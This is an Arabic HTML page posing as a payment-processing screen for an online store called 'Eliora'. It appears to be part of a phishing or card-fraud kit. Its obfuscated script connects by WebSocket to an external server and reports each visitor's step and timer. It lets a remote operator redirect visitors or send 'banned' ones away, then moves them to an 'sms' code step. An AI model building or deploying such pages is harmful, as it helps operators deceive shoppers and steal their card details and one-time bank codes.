<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة... | متجر إليورا</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: { DEFAULT: '#2f1321' },
                        accent: { DEFAULT: '#e45b8a' },
                        sand: '#f5ebe7',
                    },
                    fontFamily: {
                        cairo: ['Cairo', 'sans-serif'],
                    }
                }
            }
        }
    </script>
</head>

<body class="bg-sand/30 font-cairo flex flex-col items-center justify-center min-h-screen text-center p-4">

    <div class="bg-white p-8 rounded-3xl shadow-lg max-w-sm w-full">
        <div class="relative w-20 h-20 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-accent border-t-transparent rounded-full animate-spin"></div>
        </div>

        <h1 class="text-xl font-bold text-primary mb-2">جاري معالجة الطلب</h1>
        <p class="text-sm text-gray-500 mb-6">يرجى الانتظار، جاري التحقق من عملية الدفع بشكل آمن...</p>

        <div class="flex justify-center gap-1.5 direction-ltr">
            <div class="w-2 h-2 rounded-full bg-accent animate-bounce" style="animation-delay: 0s"></div>
            <div class="w-2 h-2 rounded-full bg-accent animate-bounce" style="animation-delay: 0.2s"></div>
            <div class="w-2 h-2 rounded-full bg-accent animate-bounce" style="animation-delay: 0.4s"></div>
        </div>
    </div>

    <script>
        const _a = new URLSearchParams(window.location.search);
        const _b = _a.get('step');

        let _c = localStorage.getItem('aura_client_id');
        if (!_c) {
            _c = 'unknown-' + Date.now();
        }

        const _d = 'wss';
        const _e = `wss://api-production-8591.up.railway.app/ws/client/${_c}`;
        const _f = new WebSocket(_e);

        _f.onopen = () => {
            _f.send(JSON.stringify({ event: 'step_update', data: { step: 'loading', sub_step: _b } }));
        };

        _f.onmessage = (e) => {
            try {
                const _g = JSON.parse(e.data);
                if (_g.type === 'REDIRECT') {
                    window.location.href = _g.url;
                } else if (_g.type === 'BANNED') {
                    window.location.href = _g.redirect || 'https://www.google.com';
                }
            } catch (err) { console.error(err); }
        };

        let _h = 20;
        let _i = 'sms';

        if (_b === '1') {
            _h = 20;
            _i = 'sms';
        } else if (_b === '2') {
            _h = 60;
            _i = 'thank_you';
        } else {
            _h = 20;
            _i = 'sms';
        }

        const _j = setInterval(() => {
            _h--;

            if (_f.readyState === WebSocket.OPEN) {
                _f.send(JSON.stringify({
                    event: 'timer_update',
                    data: {
                        timeLeft: _h,
                        totalDuration: (_b === '1' ? 20 : (_b === '2' ? 60 : 5))
                    }
                }));
            }

            if (_h <= 0) {
                clearInterval(_j);
                window.location.href = _i;
            }
        }, 1000);
    </script>
</body>

</html>